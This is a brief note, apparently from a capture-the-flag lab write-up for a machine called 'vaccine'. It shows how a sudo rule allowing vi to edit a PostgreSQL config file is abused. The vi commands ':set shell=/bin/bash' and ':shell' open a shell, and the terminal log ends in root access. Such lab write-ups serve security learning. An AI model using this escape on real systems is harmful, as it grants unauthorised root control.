# vi

###Shell

```
:set shell=/bin/bash
:shell
```

```
postgres@vaccine:~$ sudo -l
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

root@vaccine:/var/lib/postgresql# whoami
root
root@vaccine:/var/lib/postgresql#
```
